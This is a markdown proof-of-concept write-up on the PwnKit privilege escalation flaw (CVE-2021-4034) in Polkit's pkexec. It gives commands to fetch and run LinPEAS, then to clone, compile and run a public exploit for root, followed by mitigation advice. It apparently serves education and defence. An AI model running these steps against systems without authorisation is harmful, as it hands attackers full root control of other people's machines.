# Proof of Concept: CVE-2021-4034 - Pkexec Local Privilege Escalation

## Overview

This Proof of Concept (PoC) demonstrates the exploitation of **CVE-2021-4034**, a local privilege escalation vulnerability in the **Polkit** `pkexec` utility, which is part of the default installation on many Linux distributions. The vulnerability allows an unprivileged user to execute arbitrary commands as root, leading to a full system compromise.

- **CVE**: [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034)
- **Severity**: Critical
- **Platform**: Linux/Unix
- **Vulnerability Type**: Local Privilege Escalation
- **Affected Software**: Polkit `pkexec` utility
- **Impact**: Allows an unprivileged user to gain root privileges.

## Vulnerability Details

The vulnerability lies in the `pkexec` utility of **Polkit**, a component responsible for controlling system-wide privileges in Unix-like operating systems. **CVE-2021-4034**, also known as **PwnKit**, can be exploited to escalate privileges from a local, unprivileged user to root. The flaw allows arbitrary command execution due to a failure to validate the arguments passed to `pkexec`.

## How to Check if Your System is Vulnerable

To determine whether your Linux system is vulnerable to **CVE-2021-4034 (Pkexec Local Privilege Escalation)**, you can use the privilege escalation detection tool **LinPEAS**. LinPEAS helps identify common privilege escalation vectors, including known vulnerabilities like **CVE-2021-4034**.

#### Steps to Check with LinPEAS:

1. **Download LinPEAS**:
   First, download LinPEAS onto your system by running the following command:

```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh  
```

2. **Run LinPEAS**:
   Once downloaded, give LinPEAS execution permissions and run it to scan the system for privilege escalation vulnerabilities:

``` 
   chmod +x linpeas.sh
   ./linpeas.sh
```


3. **Check for Vulnerabilities**:
   After LinPEAS completes its scan, it will provide a detailed report. Look for any references to **CVE-2021-4034** or **Polkit** within the results to determine if your system is vulnerable to this specific issue.

LinPEAS provides a comprehensive security check for privilege escalation risks and can help identify vulnerabilities that need immediate attention.

## Exploitation

### Tools Required:
- A vulnerable system with `pkexec` installed (default on most Linux distributions).
- Exploit script for **CVE-2021-4034** (available on GitHub).

### Steps to Exploit:

1. **Initial Access**: 
   The attack begins by obtaining initial low-privileged user access to the target machine, such as through a reverse shell. In this case, I had a low-privileged shell from an earlier SQL injection attack.

2. **Download the Exploit**: 
   The public exploit for **CVE-2021-4034** is available on GitHub. Clone the repository containing the exploit:

```
   git clone https://github.com/ly4k/PwnKit.git
```   

3. **Compile the Exploit**: 
   Navigate to the `PwnKit` directory and compile the exploit code using GCC:

```   
   gcc pwnkit.c -o pwnkit
```   

4. **Execute the Exploit**: 
   Once the exploit is compiled, run it on the target machine. The exploit will use the vulnerability in `pkexec` to escalate privileges to root:

```   
   ./pwnkit
```   

5. **Gain Root Access**: 
   Upon successful execution, the exploit grants root-level access to the system. 

   **Proof of Exploit Example:**

   ![Proof of Exploit](https://github.com/AhsanA3/Cybersecurity-Technical-Writing/blob/main/Proof%20of%20Concept%20(PoC)/CVE-2021-4034%20-%20Pkexec%20Local%20Privilege%20Escalation/Successful%20Privesc.jpg)

## Proof of Exploit

After executing the exploit, you can verify that root access has been obtained by running the following command:

```
id
```

Expected output:

```
uid=0(root) gid=0(root) groups=0(root)
```

This output confirms that root privileges have been successfully gained on the target machine.

## Mitigation

To mitigate this vulnerability, affected users should update to a patched version of **Polkit**. System administrators should ensure that their systems are up to date with the latest security patches to prevent local privilege escalation attacks. The specific patch for **CVE-2021-4034** should be applied as soon as possible to secure the system.

Additionally:
- Enforce the principle of least privilege (POLP) by minimizing user privileges on critical systems.
- Implement a robust patch management process to keep all software up to date.

## References

- [CVE-2021-4034 on Mitre](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034)
- [Polkit GitHub Repository](https://github.com/ly4k/PwnKit)

---

**Disclaimer**: This PoC is intended for educational and research purposes only.
